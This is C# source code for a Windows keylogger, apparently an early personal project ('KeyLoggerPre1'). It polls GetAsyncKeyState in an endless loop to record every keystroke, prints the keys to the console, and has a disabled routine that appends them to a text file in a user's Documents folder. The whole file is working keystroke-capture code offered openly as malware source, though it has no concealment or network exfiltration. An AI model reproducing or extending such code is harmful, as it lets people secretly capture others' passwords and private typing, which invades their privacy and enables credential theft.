using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLoggerPre1
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public static string KelLog = "";

        public static bool CapsLockEnabled = false;
        public static bool LeftShiftToggle = false;
        public static bool RightShiftToggle = false;

        static void Main(string[] args)
        {
            Console.WriteLine("Starting Keylogger");
            while (true)
            {
                Thread.Sleep(5);

                for (int i = 7; i < 360; i++)
                {
                    int KeyState = GetAsyncKeyState(i);
                    if (KeyState == 32769)
                    {
                        KelLog = KelLog + (char)i;
                        string KeyString = i.ToString();
                        //KeyStreamWriter.WriteKeys(KeyString);

                        if (i == 8)
                        {
                            Console.Write("key:BACKSPACE, ");
                        }
                        else if (i == 9)
                        {
                            Console.Write("key:TAB, ");
                        }
                        else if (i == 13)
                        {
                            Console.Write("key:ENTER, ");
                        }
                        else if (i == 16)
                        {
                            //Shift is pressed
                            //Console.Write("key:SHIFT, ");
                            Console.Write("");
                        }
                        else if (i == 20)
                        {
                            //TODO: Check if caps lock is on before switching
                            Console.Write("key:CAPSLOCK, ");
                            CapsLockEnabled = invert(CapsLockEnabled);
                        }
                        else if (i == 32)
                        {
                            Console.Write("key:SPACE, ");
                        }
                        else if (i == 91)
                        {
                            Console.Write("key:WIN, ");
                        }
                        else if (i == 160)
                        {
                            Console.Write("key:LEFTSHIFT, ");
                            LeftShiftToggle = invert(LeftShiftToggle);
                        }
                        else if (i == 161)
                        {
                            Console.Write("key:RIGHTSHIFT, ");
                            RightShiftToggle = invert(RightShiftToggle);
                        }
                        else
                        {
                            Console.Write((char)i + ", ");
                        }
                    }
                }
            }
        }
        
        public static bool invert(bool value)
        {
            if (value)
            {
                return false;
            }
            return true;
        }
    }

    class KeyStreamWriter
    {
        public static void WriteKeys(string line)
        {
            using (StreamWriter writer = File.AppendText("C:/Users/Bryce/Documents/mykeylogger.txt"))
            {
                writer.WriteLine(line);
            }
                
        }
    }
}
